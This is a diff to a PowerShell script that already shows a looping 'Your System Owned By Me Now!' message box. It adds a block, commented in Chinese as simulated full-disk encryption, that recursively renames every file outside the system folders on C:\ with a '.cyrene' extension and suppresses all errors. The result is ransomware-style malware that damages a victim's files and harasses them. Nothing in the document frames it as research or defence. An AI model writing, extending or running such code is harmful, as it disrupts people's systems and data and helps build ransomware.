@@ -37,3 +37,34 @@ while($true) {
     [System.Windows.MessageBox]::Show("Cyrene：‘Your System Owned By Me Now!’", "Cyrene Protocol", 0, 48)
     Start-Sleep -Seconds 6
 }
+
+# --- 模拟全盘加密：修改文件后缀 ---
+# 我们从 C:\ 根目录开始，但要排除系统核心目录以防止系统崩溃
+$rootPath = "C:\"
+$excludeFolders = @("Windows", "Program Files", "Program Files (x86)", "AppData", "ProgramData")
+
+# 获取根目录下所有文件夹，过滤掉系统文件夹
+Get-ChildItem -Path $rootPath -ErrorAction SilentlyContinue | Where-Object { 
+    $_.PSIsContainer -and $excludeFolders -notcontains $_.Name 
+} | ForEach-Object {
+    $folderPath = $_.FullName
+    
+    # 递归处理选定文件夹下的文件
+    Get-ChildItem -Path $folderPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { 
+        $_.Extension -ne ".cyrene" 
+    } | ForEach-Object {
+        try {
+            $newName = $_.FullName + ".cyrene"
+            Rename-Item -Path $_.FullName -NewName $newName -Force -ErrorAction SilentlyContinue
+        } catch {
+            # 忽略正在使用的文件或拒绝访问的文件
+        }
+    }
+}
+
+# 处理直接位于 C:\ 根目录下的文件
+Get-ChildItem -Path $rootPath -File -ErrorAction SilentlyContinue | Where-Object { 
+    $_.Extension -ne ".cyrene" 
+} | ForEach-Object {
+    Rename-Item -Path $_.FullName -NewName ($_.FullName + ".cyrene") -Force -ErrorAction SilentlyContinue
+}
